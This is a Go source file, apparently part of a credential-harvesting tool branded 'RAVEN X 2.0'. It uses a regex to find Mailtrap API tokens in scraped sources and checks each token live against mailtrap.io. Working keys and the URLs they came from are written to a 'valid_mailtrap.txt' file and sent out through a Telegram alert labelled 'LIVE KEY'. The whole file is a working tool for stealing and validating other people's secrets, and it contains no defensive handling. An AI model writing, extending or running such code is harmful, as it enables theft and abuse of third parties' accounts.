package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"time"
)

var mailtrapPattern = regexp.MustCompile(`(?i)(?:mailtrap[_-]?(?:api[_-]?)?(?:token|key)|MAILTRAP_API_TOKEN)["'\s:=]+([a-f0-9]{32})`)

func (a *AWSScanner) CheckMailtrap(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailtrap {
		return false
	}
	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, err := http.NewRequest("GET", "https://mailtrap.io/api/accounts", nil)
	if err != nil {
		return false
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Api-Token", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res []struct {
		Name string `json:"name"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := ""
	if len(res) > 0 {
		info = res[0].Name
	}

	a.logValid("Mailtrap", fmt.Sprintf("Key: %s | Account: %s", key, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailtrap.txt")
	a.storeValidKeyLimit("Mailtrap", key, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📬 <b>MAILTRAP LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🏢 <b>Account:</b> %s
🔗 <b>Source:</b> %s
`, key, info, sourceURL)
	go a.sendTelegram(msg)
	return true
}
